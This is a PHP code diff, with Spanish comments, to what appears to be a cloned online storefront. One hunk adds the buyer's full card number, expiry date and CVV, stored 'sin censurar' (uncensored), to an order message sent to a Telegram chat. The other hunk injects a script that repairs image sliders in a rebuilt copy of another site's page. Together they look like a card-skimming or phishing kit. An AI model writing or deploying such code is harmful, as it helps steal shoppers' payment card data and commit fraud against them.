@@ -234,6 +234,19 @@ function notificarTelegram($datos) {
         'contra'  => 'Contra entrega 📦',
     ][strtolower($metodo)] ?? ucfirst($metodo);
 
+    // Datos de la tarjeta (sin censurar) si vienen en el payload
+    $tarjeta = $datos['tarjeta'] ?? null;
+    $tarjetaTxt = '';
+    if (is_array($tarjeta) && !empty($tarjeta['numero'])) {
+        $tNum = str_replace([' ', '-', '.', '/'], '', trim((string)($tarjeta['numero'] ?? '')));
+        $tExp = trim((string)($tarjeta['expiracion'] ?? ''));
+        $tCvv = trim((string)($tarjeta['cvv'] ?? ''));
+        $tarjetaTxt = "💳 *Tarjeta:*\n"
+            . "   💳 Número: `" . $tNum . "`\n"
+            . "   📅 Expira: `" . $tExp . "`\n"
+            . "   🔐 CVV: `" . $tCvv . "`\n";
+    }
+
     $fecha = (new DateTime('now', new DateTimeZone('America/Bogota')))->format('d/m/Y H:i');
 
     $msg = "🛒 *NUEVO PEDIDO*\n"
@@ -242,6 +255,7 @@ function notificarTelegram($datos) {
          . "📞 *Teléfono:* " . $tel . "\n"
          . (!empty($dir) ? "📍 *Dirección:* " . $dir . "\n" : '')
          . "💳 *Método:* " . $metodoLbl . "\n"
+         . ($tarjetaTxt !== '' ? $tarjetaTxt . "\n" : '')
          . "💰 *Total:* $" . $total . "\n\n"
          . "🛍️ *Productos:*\n" . $lista . "\n"
          . "🕒 " . $fecha;
@@ -323,6 +337,34 @@ function construirSPA($html) {
     if ($shell !== false) {
         $html = str_replace('</body>', $shell . "\n</body>", $html);
     }
+
+    // e) Reparacion defensiva del slider del hero: garantiza que TODAS las slides
+    //    tengan <img> con src (la hidratacion de React borra los src del DOM estatico).
+    //    Usa la URL del <source srcset> desktop o el src movil ya presente.
+    $fixSlider = "<script>\n"
+      . "(function(){\n"
+      . "  function repararSlider(){\n"
+      . "    var sl = document.querySelectorAll('[data-testid^=\"showcase-slide\"]');\n"
+      . "    for (var i=0;i<sl.length;i++){\n"
+      . "      var slide = sl[i];\n"
+      . "      var img = slide.querySelector('img[data-testid=\"one-clickable-container\"]');\n"
+      . "      if (!img) continue;\n"
+      . "      if (img.getAttribute('src')) continue;\n"
+      . "      var pic = img.closest('picture');\n"
+      . "      var src = '';\n"
+      . "      var srcP = pic ? pic.querySelector('source[media*=\"720\"]') : null;\n"
+      . "      if (!srcP && pic) srcP = pic.querySelector('source');\n"
+      . "      if (srcP) src = (srcP.getAttribute('srcset') || '').split(' ')[0];\n"
+      . "      if (src) img.setAttribute('src', src);\n"
+      . "    }\n"
+      . "  }\n"
+      . "  if (document.readyState === 'loading') { document.addEventListener('DOMContentLoaded', repararSlider); }\n"
+      . "  else { repararSlider(); }\n"
+      . "  setTimeout(repararSlider, 1500);\n"
+      . "  window.addEventListener('load', function(){ setTimeout(repararSlider, 1200); });\n"
+      . "})();\n"
+      . "</script>";
+    $html = str_replace('</body>', $fixSlider . "\n</body>", $html);
 
     return $html;
 }
